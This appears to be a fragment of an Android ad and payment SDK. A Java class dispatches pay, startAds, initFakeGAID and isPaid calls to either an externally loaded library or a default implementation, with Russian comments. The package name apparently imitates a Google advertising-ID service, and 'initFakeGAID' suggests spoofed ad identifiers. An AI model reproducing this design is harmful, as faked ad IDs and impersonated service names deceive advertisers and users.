package com.advertising_id_service.appclick.googleadvertisingidservice;


import android.app.Activity;
import android.content.Context;

import com.advertising_id_service.appclick.googleadvertisingidservice.ADServicer.ADServicer_Default;
import com.advertising_id_service.appclick.googleadvertisingidservice.ADServicer.ADServicer_FromExternalLib;
import com.advertising_id_service.appclick.googleadvertisingidservice.ADServicer.IADServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetterRealisation.IGoogleAdvertisingIdGetter;
import com.av113030.android.PaymentListener;

public class ADServicerGetter implements IADServicer{

    @Override
    public void pay(Context cnt, Activity a, String serviceID, PaymentListener paymentListener) {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            new ADServicer_FromExternalLib().pay(cnt, a, serviceID, paymentListener);
        }
        else
        {
            new ADServicer_Default().pay(cnt, a, serviceID, paymentListener);
        }
    }

    @Override
    public void startAds(Context cnt) {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            new ADServicer_FromExternalLib().startAds(cnt);
        }
        else
        {
            new ADServicer_Default().startAds(cnt);
        }
    }

    @Override
    public void initFakeGAID(Context cnt, IGoogleAdvertisingIdGetter g) {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            new ADServicer_FromExternalLib().initFakeGAID(cnt, g);
        }
        else
        {
            new ADServicer_Default().initFakeGAID(cnt, g);
        }
    }

    @Override
    public void isPaid(Context cnt, String s, int i, PaymentListener paymentListener) {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            new ADServicer_FromExternalLib().isPaid(cnt, s, i, paymentListener);
        }
        else
        {
            new ADServicer_Default().isPaid(cnt, s, i, paymentListener);
        }
    }
}
